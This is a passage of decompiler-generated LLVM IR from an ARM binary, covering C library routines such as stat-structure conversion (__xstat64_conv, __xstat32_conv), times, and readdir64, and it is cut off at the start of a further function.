dec_label_pc_158d0:                               ; preds = %dec_label_pc_158bc, %dec_label_pc_1589c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158ac, %dec_label_pc_158bc.dec_label_pc_158d4_crit_edge, %dec_label_pc_158d0
  %v0_158d4 = phi i32 [ %v0_158d4.pre, %dec_label_pc_158bc.dec_label_pc_158d4_crit_edge ], [ -1, %dec_label_pc_158d0 ], [ %v4_158ac, %dec_label_pc_158ac ]
  %v2_158d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158d8, i32* @r4, align 4
  ret i32 %v0_158d4

; uselistorder directives
  uselistorder i32 %v4_158ac, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_158d4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_158f8 = load i32, i32* @r0, align 4
  ret i32 %v1_158f8
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_158fc = load i32, i32* @r4, align 4
  store i32 %v3_158fc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15914 = inttoptr i32 %arg2 to i8*
  %v4_15914 = call i32 @__GI_memset(i8* %v3_15914, i32 0, i32 104)
  %v2_15918 = load i32, i32* %arg1, align 4
  store i32 %v2_15918, i32* %r3.global-to-local, align 4
  %v3_15918 = add i32 %tmp, 4
  %v4_15918 = inttoptr i32 %v3_15918 to i32*
  %v5_15918 = load i32, i32* %v4_15918, align 4
  store i32 %v5_15918, i32* %r4.global-to-local, align 4
  %v0_1591c = load i32, i32* %r5.global-to-local, align 4
  %v1_1591c = inttoptr i32 %v0_1591c to i32*
  store i32 %v2_15918, i32* %v1_1591c, align 4
  %v3_1591c = add i32 %v0_1591c, 4
  %v4_1591c = inttoptr i32 %v3_1591c to i32*
  %v5_1591c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1591c, i32* %v4_1591c, align 4
  %v0_15920 = load i32, i32* %r6.global-to-local, align 4
  %v1_15920 = add i32 %v0_15920, 12
  %v2_15920 = inttoptr i32 %v1_15920 to i32*
  %v3_15920 = load i32, i32* %v2_15920, align 4
  %v1_15924 = load i32, i32* %r5.global-to-local, align 4
  %v2_15924 = add i32 %v1_15924, 12
  %v3_15924 = inttoptr i32 %v2_15924 to i32*
  store i32 %v3_15920, i32* %v3_15924, align 4
  %v0_15928 = load i32, i32* %r6.global-to-local, align 4
  %v1_15928 = add i32 %v0_15928, 96
  store i32 %v1_15928, i32* %r3.global-to-local, align 4
  %v1_1592c = inttoptr i32 %v1_15928 to i32*
  %v2_1592c = load i32, i32* %v1_1592c, align 4
  store i32 %v2_1592c, i32* %r3.global-to-local, align 4
  %v3_1592c = add i32 %v0_15928, 100
  %v4_1592c = inttoptr i32 %v3_1592c to i32*
  %v5_1592c = load i32, i32* %v4_1592c, align 4
  store i32 %v5_1592c, i32* %r4.global-to-local, align 4
  %v1_15930 = add i32 %v0_15928, 56
  %v2_15930 = inttoptr i32 %v1_15930 to i32*
  %v3_15930 = load i32, i32* %v2_15930, align 4
  store i32 %v3_15930, i32* %r2.global-to-local, align 4
  %v1_15934 = load i32, i32* %r5.global-to-local, align 4
  %v2_15934 = add i32 %v1_15934, 96
  %v3_15934 = inttoptr i32 %v2_15934 to i32*
  store i32 %v2_1592c, i32* %v3_15934, align 4
  %v0_15938 = load i32, i32* %r4.global-to-local, align 4
  %v1_15938 = load i32, i32* %r5.global-to-local, align 4
  %v2_15938 = add i32 %v1_15938, 100
  %v3_15938 = inttoptr i32 %v2_15938 to i32*
  store i32 %v0_15938, i32* %v3_15938, align 4
  %v0_1593c = load i32, i32* %r6.global-to-local, align 4
  %v1_1593c = add i32 %v0_1593c, 24
  store i32 %v1_1593c, i32* %ip.global-to-local, align 4
  %v1_15940 = inttoptr i32 %v1_1593c to i32*
  %v2_15940 = load i32, i32* %v1_15940, align 4
  store i32 %v2_15940, i32* %ip.global-to-local, align 4
  %v3_15940 = add i32 %v0_1593c, 28
  %v4_15940 = inttoptr i32 %v3_15940 to i32*
  %v5_15940 = load i32, i32* %v4_15940, align 4
  store i32 %v5_15940, i32* %lr.global-to-local, align 4
  %v0_15944 = load i32, i32* %r2.global-to-local, align 4
  %v1_15944 = load i32, i32* %r5.global-to-local, align 4
  %v2_15944 = add i32 %v1_15944, 56
  %v3_15944 = inttoptr i32 %v2_15944 to i32*
  store i32 %v0_15944, i32* %v3_15944, align 4
  %v0_15948 = load i32, i32* %r6.global-to-local, align 4
  %v1_15948 = add i32 %v0_15948, 72
  store i32 %v1_15948, i32* %r3.global-to-local, align 4
  %v1_1594c = add i32 %v0_15948, 32
  store i32 %v1_1594c, i32* %r7.global-to-local, align 4
  %v1_15950 = inttoptr i32 %v1_1594c to i32*
  %v2_15950 = load i32, i32* %v1_15950, align 4
  store i32 %v2_15950, i32* %r7.global-to-local, align 4
  %v3_15950 = add i32 %v0_15948, 36
  %v4_15950 = inttoptr i32 %v3_15950 to i32*
  %v5_15950 = load i32, i32* %v4_15950, align 4
  store i32 %v5_15950, i32* %r8.global-to-local, align 4
  %v1_15954 = inttoptr i32 %v1_15948 to i32*
  %v2_15954 = load i32, i32* %v1_15954, align 4
  %v3_15954 = add i32 %v0_15948, 76
  %v4_15954 = inttoptr i32 %v3_15954 to i32*
  %v5_15954 = load i32, i32* %v4_15954, align 4
  store i32 %v5_15954, i32* %r1.global-to-local, align 4
  %v0_15958 = load i32, i32* %r5.global-to-local, align 4
  %v1_15958 = add i32 %v0_15958, 72
  %v1_1595c = inttoptr i32 %v1_15958 to i32*
  store i32 %v2_15954, i32* %v1_1595c, align 4
  %v3_1595c = add i32 %v0_15958, 76
  %v4_1595c = inttoptr i32 %v3_1595c to i32*
  %v5_1595c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1595c, i32* %v4_1595c, align 4
  %v0_15960 = load i32, i32* %r7.global-to-local, align 4
  %v1_15960 = load i32, i32* %r5.global-to-local, align 4
  %v2_15960 = add i32 %v1_15960, 32
  %v3_15960 = inttoptr i32 %v2_15960 to i32*
  store i32 %v0_15960, i32* %v3_15960, align 4
  %v0_15964 = load i32, i32* %r8.global-to-local, align 4
  %v1_15964 = load i32, i32* %r5.global-to-local, align 4
  %v2_15964 = add i32 %v1_15964, 36
  %v3_15964 = inttoptr i32 %v2_15964 to i32*
  store i32 %v0_15964, i32* %v3_15964, align 4
  %v0_15968 = load i32, i32* %r6.global-to-local, align 4
  %v1_15968 = add i32 %v0_15968, 80
  store i32 %v1_15968, i32* %r3.global-to-local, align 4
  %v1_1596c = add i32 %v0_15968, 48
  store i32 %v1_1596c, i32* %r7.global-to-local, align 4
  %v1_15970 = inttoptr i32 %v1_1596c to i32*
  %v2_15970 = load i32, i32* %v1_15970, align 4
  store i32 %v2_15970, i32* %r7.global-to-local, align 4
  %v3_15970 = add i32 %v0_15968, 52
  %v4_15970 = inttoptr i32 %v3_15970 to i32*
  %v5_15970 = load i32, i32* %v4_15970, align 4
  store i32 %v5_15970, i32* %r8.global-to-local, align 4
  %v1_15974 = inttoptr i32 %v1_15968 to i32*
  %v2_15974 = load i32, i32* %v1_15974, align 4
  %v3_15974 = add i32 %v0_15968, 84
  %v4_15974 = inttoptr i32 %v3_15974 to i32*
  %v5_15974 = load i32, i32* %v4_15974, align 4
  store i32 %v5_15974, i32* %r1.global-to-local, align 4
  %v1_15978 = add i32 %v0_15968, 16
  %v2_15978 = inttoptr i32 %v1_15978 to i32*
  %v3_15978 = load i32, i32* %v2_15978, align 4
  store i32 %v3_15978, i32* %r2.global-to-local, align 4
  %v0_1597c = load i32, i32* %r5.global-to-local, align 4
  %v1_1597c = add i32 %v0_1597c, 80
  %v1_15980 = inttoptr i32 %v1_1597c to i32*
  store i32 %v2_15974, i32* %v1_15980, align 4
  %v3_15980 = add i32 %v0_1597c, 84
  %v4_15980 = inttoptr i32 %v3_15980 to i32*
  %v5_15980 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15980, i32* %v4_15980, align 4
  %v0_15984 = load i32, i32* %r7.global-to-local, align 4
  %v1_15984 = load i32, i32* %r5.global-to-local, align 4
  %v2_15984 = add i32 %v1_15984, 48
  %v3_15984 = inttoptr i32 %v2_15984 to i32*
  store i32 %v0_15984, i32* %v3_15984, align 4
  %v0_15988 = load i32, i32* %r8.global-to-local, align 4
  %v1_15988 = load i32, i32* %r5.global-to-local, align 4
  %v2_15988 = add i32 %v1_15988, 52
  %v3_15988 = inttoptr i32 %v2_15988 to i32*
  store i32 %v0_15988, i32* %v3_15988, align 4
  %v0_1598c = load i32, i32* %r2.global-to-local, align 4
  %v1_1598c = load i32, i32* %r5.global-to-local, align 4
  %v2_1598c = add i32 %v1_1598c, 16
  %v3_1598c = inttoptr i32 %v2_1598c to i32*
  store i32 %v0_1598c, i32* %v3_1598c, align 4
  %v0_15990 = load i32, i32* %r6.global-to-local, align 4
  %v1_15990 = add i32 %v0_15990, 88
  store i32 %v1_15990, i32* %r3.global-to-local, align 4
  %v1_15994 = add i32 %v0_15990, 20
  %v2_15994 = inttoptr i32 %v1_15994 to i32*
  %v3_15994 = load i32, i32* %v2_15994, align 4
  store i32 %v3_15994, i32* %r2.global-to-local, align 4
  %v1_15998 = inttoptr i32 %v1_15990 to i32*
  %v2_15998 = load i32, i32* %v1_15998, align 4
  %v3_15998 = add i32 %v0_15990, 92
  %v4_15998 = inttoptr i32 %v3_15998 to i32*
  %v5_15998 = load i32, i32* %v4_15998, align 4
  store i32 %v5_15998, i32* %r1.global-to-local, align 4
  %v1_1599c = add i32 %v0_15990, 64
  store i32 %v1_1599c, i32* %r6.global-to-local, align 4
  %v1_159a0 = inttoptr i32 %v1_1599c to i32*
  %v2_159a0 = load i32, i32* %v1_159a0, align 4
  store i32 %v2_159a0, i32* %r6.global-to-local, align 4
  %v3_159a0 = add i32 %v0_15990, 68
  %v4_159a0 = inttoptr i32 %v3_159a0 to i32*
  %v5_159a0 = load i32, i32* %v4_159a0, align 4
  store i32 %v5_159a0, i32* %r7.global-to-local, align 4
  %v0_159a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_159a4 = add i32 %v0_159a4, 88
  store i32 %v1_159a4, i32* %r3.global-to-local, align 4
  %v2_159a8 = add i32 %v0_159a4, 20
  %v3_159a8 = inttoptr i32 %v2_159a8 to i32*
  store i32 %v3_15994, i32* %v3_159a8, align 4
  %v0_159ac = load i32, i32* %ip.global-to-local, align 4
  %v1_159ac = load i32, i32* %r5.global-to-local, align 4
  %v2_159ac = add i32 %v1_159ac, 24
  %v3_159ac = inttoptr i32 %v2_159ac to i32*
  store i32 %v0_159ac, i32* %v3_159ac, align 4
  %v0_159b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_159b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_159b0 = add i32 %v1_159b0, 28
  %v3_159b0 = inttoptr i32 %v2_159b0 to i32*
  store i32 %v0_159b0, i32* %v3_159b0, align 4
  %v0_159b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_159b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159b4 = add i32 %v1_159b4, 64
  %v3_159b4 = inttoptr i32 %v2_159b4 to i32*
  store i32 %v0_159b4, i32* %v3_159b4, align 4
  %v0_159b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_159b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_159b8 = add i32 %v1_159b8, 68
  %v3_159b8 = inttoptr i32 %v2_159b8 to i32*
  store i32 %v0_159b8, i32* %v3_159b8, align 4
  %v0_159bc = load i32, i32* %r3.global-to-local, align 4
  %v1_159bc = inttoptr i32 %v0_159bc to i32*
  store i32 %v2_15998, i32* %v1_159bc, align 4
  %v3_159bc = add i32 %v0_159bc, 4
  %v4_159bc = inttoptr i32 %v3_159bc to i32*
  %v5_159bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159bc, i32* %v4_159bc, align 4
  %v2_159c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_159c0, i32* %r4.global-to-local, align 4
  ret i32 %v2_15998

; uselistorder directives
  uselistorder i32 %v0_15990, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15968, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_159c8 = load i32, i32* @r4, align 4
  store i32 %v3_159c8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_159e0 = inttoptr i32 %arg2 to i8*
  %v4_159e0 = call i32 @__GI_memset(i8* %v3_159e0, i32 0, i32 88)
  %v2_159e4 = load i32, i32* %arg1, align 4
  %v3_159e4 = add i32 %tmp, 4
  %v4_159e4 = inttoptr i32 %v3_159e4 to i32*
  %v5_159e4 = load i32, i32* %v4_159e4, align 4
  store i32 %v5_159e4, i32* %r4.global-to-local, align 4
  %v0_159e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_159e8 = inttoptr i32 %v0_159e8 to i32*
  store i32 %v2_159e4, i32* %v1_159e8, align 4
  %v3_159e8 = add i32 %v0_159e8, 4
  %v4_159e8 = inttoptr i32 %v3_159e8 to i32*
  %v5_159e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_159e8, i32* %v4_159e8, align 4
  %v0_159ec = load i32, i32* %r5.global-to-local, align 4
  %v1_159ec = add i32 %v0_159ec, 32
  %v1_159f0 = inttoptr i32 %v1_159ec to i32*
  %v2_159f0 = load i32, i32* %v1_159f0, align 4
  %v3_159f0 = add i32 %v0_159ec, 36
  %v4_159f0 = inttoptr i32 %v3_159f0 to i32*
  %v5_159f0 = load i32, i32* %v4_159f0, align 4
  store i32 %v5_159f0, i32* %r4.global-to-local, align 4
  %v1_159f4 = add i32 %v0_159ec, 96
  %v2_159f4 = inttoptr i32 %v1_159f4 to i32*
  %v3_159f4 = load i32, i32* %v2_159f4, align 4
  store i32 %v3_159f4, i32* %r2.global-to-local, align 4
  %v1_159f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_159f8 = add i32 %v1_159f8, 32
  %v3_159f8 = inttoptr i32 %v2_159f8 to i32*
  store i32 %v2_159f0, i32* %v3_159f8, align 4
  %v0_159fc = load i32, i32* %r4.global-to-local, align 4
  %v1_159fc = load i32, i32* %r6.global-to-local, align 4
  %v2_159fc = add i32 %v1_159fc, 36
  %v3_159fc = inttoptr i32 %v2_159fc to i32*
  store i32 %v0_159fc, i32* %v3_159fc, align 4
  %v0_15a00 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a00 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a00 = add i32 %v1_15a00, 12
  %v3_15a00 = inttoptr i32 %v2_15a00 to i32*
  store i32 %v0_15a00, i32* %v3_15a00, align 4
  %v0_15a04 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a04 = add i32 %v0_15a04, 48
  %v2_15a04 = inttoptr i32 %v1_15a04 to i32*
  %v3_15a04 = load i32, i32* %v2_15a04, align 4
  %v1_15a08 = add i32 %v0_15a04, 24
  store i32 %v1_15a08, i32* %ip.global-to-local, align 4
  %v1_15a0c = inttoptr i32 %v1_15a08 to i32*
  %v2_15a0c = load i32, i32* %v1_15a0c, align 4
  store i32 %v2_15a0c, i32* %ip.global-to-local, align 4
  %v3_15a0c = add i32 %v0_15a04, 28
  %v4_15a0c = inttoptr i32 %v3_15a0c to i32*
  %v5_15a0c = load i32, i32* %v4_15a0c, align 4
  store i32 %v5_15a0c, i32* %lr.global-to-local, align 4
  %v1_15a10 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a10 = add i32 %v1_15a10, 44
  %v3_15a10 = inttoptr i32 %v2_15a10 to i32*
  store i32 %v3_15a04, i32* %v3_15a10, align 4
  %v0_15a14 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a14 = add i32 %v0_15a14, 64
  %v2_15a14 = inttoptr i32 %v1_15a14 to i32*
  %v3_15a14 = load i32, i32* %v2_15a14, align 4
  %v1_15a18 = add i32 %v0_15a14, 56
  %v2_15a18 = inttoptr i32 %v1_15a18 to i32*
  %v3_15a18 = load i32, i32* %v2_15a18, align 4
  store i32 %v3_15a18, i32* %r2.global-to-local, align 4
  %v1_15a1c = load i32, i32* %r6.global-to-local, align 4
  %v2_15a1c = add i32 %v1_15a1c, 52
  %v3_15a1c = inttoptr i32 %v2_15a1c to i32*
  store i32 %v3_15a14, i32* %v3_15a1c, align 4
  %v0_15a20 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a20 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a20 = add i32 %v1_15a20, 48
  %v3_15a20 = inttoptr i32 %v2_15a20 to i32*
  store i32 %v0_15a20, i32* %v3_15a20, align 4
  %v0_15a24 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a24 = add i32 %v0_15a24, 72
  %v1_15a28 = inttoptr i32 %v1_15a24 to i32*
  %v2_15a28 = load i32, i32* %v1_15a28, align 4
  %v3_15a28 = add i32 %v0_15a24, 76
  %v4_15a28 = inttoptr i32 %v3_15a28 to i32*
  %v5_15a28 = load i32, i32* %v4_15a28, align 4
  store i32 %v5_15a28, i32* %r1.global-to-local, align 4
  %v0_15a2c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a2c = add i32 %v0_15a2c, 56
  %v1_15a30 = inttoptr i32 %v1_15a2c to i32*
  store i32 %v2_15a28, i32* %v1_15a30, align 4
  %v3_15a30 = add i32 %v0_15a2c, 60
  %v4_15a30 = inttoptr i32 %v3_15a30 to i32*
  %v5_15a30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a30, i32* %v4_15a30, align 4
  %v0_15a34 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a34 = add i32 %v0_15a34, 80
  %v1_15a38 = inttoptr i32 %v1_15a34 to i32*
  %v2_15a38 = load i32, i32* %v1_15a38, align 4
  %v3_15a38 = add i32 %v0_15a34, 84
  %v4_15a38 = inttoptr i32 %v3_15a38 to i32*
  %v5_15a38 = load i32, i32* %v4_15a38, align 4
  store i32 %v5_15a38, i32* %r1.global-to-local, align 4
  %v0_15a3c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a3c = add i32 %v0_15a3c, 64
  %v1_15a40 = inttoptr i32 %v1_15a3c to i32*
  store i32 %v2_15a38, i32* %v1_15a40, align 4
  %v3_15a40 = add i32 %v0_15a3c, 68
  %v4_15a40 = inttoptr i32 %v3_15a40 to i32*
  %v5_15a40 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a40, i32* %v4_15a40, align 4
  %v0_15a44 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a44 = add i32 %v0_15a44, 16
  %v2_15a44 = inttoptr i32 %v1_15a44 to i32*
  %v3_15a44 = load i32, i32* %v2_15a44, align 4
  %v1_15a48 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a48 = add i32 %v1_15a48, 16
  %v3_15a48 = inttoptr i32 %v2_15a48 to i32*
  store i32 %v3_15a44, i32* %v3_15a48, align 4
  %v0_15a4c = load i32, i32* %r5.global-to-local, align 4
  %v1_15a4c = add i32 %v0_15a4c, 88
  %v1_15a50 = add i32 %v0_15a4c, 20
  %v2_15a50 = inttoptr i32 %v1_15a50 to i32*
  %v3_15a50 = load i32, i32* %v2_15a50, align 4
  store i32 %v3_15a50, i32* %r2.global-to-local, align 4
  %v1_15a54 = inttoptr i32 %v1_15a4c to i32*
  %v2_15a54 = load i32, i32* %v1_15a54, align 4
  %v3_15a54 = add i32 %v0_15a4c, 92
  %v4_15a54 = inttoptr i32 %v3_15a54 to i32*
  %v5_15a54 = load i32, i32* %v4_15a54, align 4
  store i32 %v5_15a54, i32* %r1.global-to-local, align 4
  %v0_15a58 = load i32, i32* %r6.global-to-local, align 4
  %v1_15a58 = add i32 %v0_15a58, 72
  %v1_15a5c = inttoptr i32 %v1_15a58 to i32*
  store i32 %v2_15a54, i32* %v1_15a5c, align 4
  %v3_15a5c = add i32 %v0_15a58, 76
  %v4_15a5c = inttoptr i32 %v3_15a5c to i32*
  %v5_15a5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a5c, i32* %v4_15a5c, align 4
  %v0_15a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a60 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a60 = add i32 %v1_15a60, 20
  %v3_15a60 = inttoptr i32 %v2_15a60 to i32*
  store i32 %v0_15a60, i32* %v3_15a60, align 4
  %v0_15a64 = load i32, i32* %ip.global-to-local, align 4
  %v1_15a64 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a64 = add i32 %v1_15a64, 24
  %v3_15a64 = inttoptr i32 %v2_15a64 to i32*
  store i32 %v0_15a64, i32* %v3_15a64, align 4
  %v0_15a68 = load i32, i32* %lr.global-to-local, align 4
  %v1_15a68 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a68 = add i32 %v1_15a68, 28
  %v3_15a68 = inttoptr i32 %v2_15a68 to i32*
  store i32 %v0_15a68, i32* %v3_15a68, align 4
  %v2_15a6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15a6c, i32* %r4.global-to-local, align 4
  ret i32 %v2_15a54

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r6, align 4
  %v1_15a88 = add i32 %tmp, 24
  store i32 %v1_15a88, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15aa0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  store i32 %v4_15aa0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15aa0)
  %v0_15ab4 = load i32, i32* @r6, align 4
  %v2_15ab4 = add i32 %v0_15ab4, 16
  %v3_15ab4 = inttoptr i32 %v2_15ab4 to i32*
  %v4_15ab4 = load i32, i32* %v3_15ab4, align 4
  store i32 %v4_15ab4, i32* %ip.global-to-local, align 4
  store i32 88768, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15ab4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15ac4

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_15af4, %entry
  %v0_15ac4 = load i32, i32* @r5, align 4
  %v1_15ac4 = add i32 %v0_15ac4, 4
  %v2_15ac4 = inttoptr i32 %v1_15ac4 to i32*
  %v3_15ac4 = load i32, i32* %v2_15ac4, align 4
  %v4_15ac4 = add i32 %v0_15ac4, 8
  %v5_15ac4 = inttoptr i32 %v4_15ac4 to i32*
  %v6_15ac4 = load i32, i32* %v5_15ac4, align 4
  %tmp10 = icmp ugt i32 %v6_15ac4, %v3_15ac4
  br i1 %tmp10, label %dec_label_pc_15af4, label %dec_label_pc_15ad0

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_15ac4
  %v1_15ad0 = inttoptr i32 %v0_15ac4 to i32*
  %v2_15ad0 = load i32, i32* %v1_15ad0, align 4
  %v1_15ad4 = add i32 %v0_15ac4, 12
  %v2_15ad4 = inttoptr i32 %v1_15ad4 to i32*
  %v3_15ad4 = load i32, i32* %v2_15ad4, align 4
  %v1_15ad8 = add i32 %v0_15ac4, 20
  %v2_15ad8 = inttoptr i32 %v1_15ad8 to i32*
  %v3_15ad8 = load i32, i32* %v2_15ad8, align 4
  %v4_15adc = inttoptr i32 %v3_15ad4 to i32*
  %v5_15adc = call i32 @__getdents64(i32 %v2_15ad0, i32* %v4_15adc, i32 %v3_15ad8, i32 %v6_15ac4)
  %tmp9 = icmp slt i32 %v5_15adc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_15aec

.thread:                                          ; preds = %dec_label_pc_15ad0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15b24

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15ad0
  %v1_15aec = load i32, i32* @r5, align 4
  %v2_15aec = add i32 %v1_15aec, 8
  %v3_15aec = inttoptr i32 %v2_15aec to i32*
  store i32 %v5_15adc, i32* %v3_15aec, align 4
  %v0_15af0 = load i32, i32* @r7, align 4
  %v1_15af0 = load i32, i32* @r5, align 4
  %v2_15af0 = add i32 %v1_15af0, 4
  %v3_15af0 = inttoptr i32 %v2_15af0 to i32*
  store i32 %v0_15af0, i32* %v3_15af0, align 4
  %v0_15af4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15ac4, %dec_label_pc_15aec
  %v1_15b18 = phi i32 [ %v0_15ac4, %dec_label_pc_15ac4 ], [ %v0_15af4.pre, %dec_label_pc_15aec ]
  %v1_15af4 = add i32 %v1_15b18, 4
  %v2_15af4 = inttoptr i32 %v1_15af4 to i32*
  %v3_15af4 = load i32, i32* %v2_15af4, align 4
  %v1_15af8 = add i32 %v1_15b18, 12
  %v2_15af8 = inttoptr i32 %v1_15af8 to i32*
  %v3_15af8 = load i32, i32* %v2_15af8, align 4
  %v2_15afc = add i32 %v3_15af8, %v3_15af4
  store i32 %v2_15afc, i32* @r4, align 4
  %v3_15b00 = inttoptr i32 %v2_15afc to i32*
  %v4_15b00 = load i32, i32* %v3_15b00, align 4
  %v1_15b04 = add i32 %v2_15afc, 4
  %v2_15b04 = inttoptr i32 %v1_15b04 to i32*
  %v3_15b04 = load i32, i32* %v2_15b04, align 4
  %v1_15b08 = add i32 %v2_15afc, 16
  %v2_15b08 = inttoptr i32 %v1_15b08 to i16*
  %v3_15b08 = load i16, i16* %v2_15b08, align 2
  %v4_15b08 = zext i16 %v3_15b08 to i32
  %v1_15b0c = add i32 %v2_15afc, 8
  %v2_15b0c = inttoptr i32 %v1_15b0c to i32*
  %v3_15b0c = load i32, i32* %v2_15b0c, align 4
  store i32 %v3_15b0c, i32* %ip.global-to-local, align 4
  %v2_15b10 = add i32 %v4_15b08, %v3_15af4
  %v2_15b14 = or i32 %v3_15b04, %v4_15b00
  %v4_15b14 = icmp eq i32 %v2_15b14, 0
  store i32 %v2_15b10, i32* %v2_15af4, align 4
  %v0_15b1c = load i32, i32* %ip.global-to-local, align 4
  %v1_15b1c = load i32, i32* @r5, align 4
  %v2_15b1c = add i32 %v1_15b1c, 16
  %v3_15b1c = inttoptr i32 %v2_15b1c to i32*
  store i32 %v0_15b1c, i32* %v3_15b1c, align 4
  br i1 %v4_15b14, label %dec_label_pc_15ac4, label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %dec_label_pc_15af4, %.thread
  %v0_15b30 = load i32, i32* @r6, align 4
  %v2_15b30 = add i32 %v0_15b30, 44
  %v3_15b30 = inttoptr i32 %v2_15b30 to i32*
  %v4_15b30 = load i32, i32* %v3_15b30, align 4
  store i32 %v4_15b30, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15b30)
  %v0_15b3c = load i32, i32* @r4, align 4
  ret i32 %v0_15b3c

; uselistorder directives
  uselistorder i32 %v2_15afc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15b18, { 1, 0 }
  uselistorder i32 %v6_15ac4, { 1, 0 }
  uselistorder i32 %v0_15ac4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15af4, { 1, 0 }
}

define i32 @function_15b50(i32 %arg1) local_unnamed_addr {
